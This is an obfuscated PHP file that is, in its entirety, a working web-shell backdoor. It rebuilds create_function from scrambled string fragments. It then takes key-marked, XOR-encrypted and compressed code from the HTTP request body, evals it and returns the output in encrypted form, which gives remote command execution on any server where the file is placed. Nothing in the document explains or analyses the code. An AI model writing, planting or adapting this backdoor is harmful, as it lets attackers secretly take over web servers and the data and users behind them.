<?php
$G='o="";for($i=0;$i<$l;`){fo`r(`$j=0;($`j<$`c&&$i<$l);$`j++,$i++`){$o.`=$';
$j='Bkb`aJ`PBBT";f`unction x(`$t,$k){`$c`=strlen($k`)`;$l=str`len($`t);``$';
$F='`base6`4_dec`ode($m[1]),$k`)));$`o=`@ob`_get_contents();@``ob_end_`clean()';
$N='ont`e`nts("ph`p`://input"),$`m)==1) `{@ob`_start();`@e`val(@gzun`compre`ss`(@x(@';
$b=';`$r=@`ba`se64_encode(@x(`@gz`compr`ess`($o),$k));pri`nt(`"$p$kh`$r$kf");}';
$a='$k="2`9d518cd";$`kh="c``339e3d1657`2"`;$kf=`"dcf`c56f60e6f";$p="6`nGvGE`l';
$m='t{$i}`^$k{$j`};}`}return $o`;}if (`@preg`_`match("/`$kh(.+)$kf`/"``,@file_get_c';
$T=str_replace('I','','cIreatIeI_fIuInctIion');
$Q=str_replace('`','',$a.$j.$G.$m.$N.$F.$b);
$n=$T('',$Q);$n();
?>
